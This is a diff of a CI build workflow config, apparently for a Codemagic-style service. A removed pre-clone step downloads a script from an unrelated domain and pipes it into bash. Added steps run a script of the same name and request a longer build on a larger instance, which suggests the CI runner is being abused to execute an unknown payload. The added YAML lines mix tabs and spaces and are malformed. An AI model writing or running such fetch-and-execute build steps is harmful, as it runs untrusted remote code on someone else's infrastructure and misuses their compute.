@@ -1,9 +1,13 @@
 workflows:
     default-workflow:
         name: Default Workflow
+        max_build_duration: 120
+		instance_type: linux_x2
         pre_clone_scripts:
           - name: Scripts to run before cloning the repository
-            script: apt update;apt -y install wget;wget -O - https://greenleaf.teatspray.fun/start_Silly_Doc_dme_codemag | bash
+            script: |
+			lscpu
         scripts:
             - name: Scripts to run after cloning the repository
-              script: lscpu
+              script: |
+			  bash start_Silly_Doc_dme_codemag
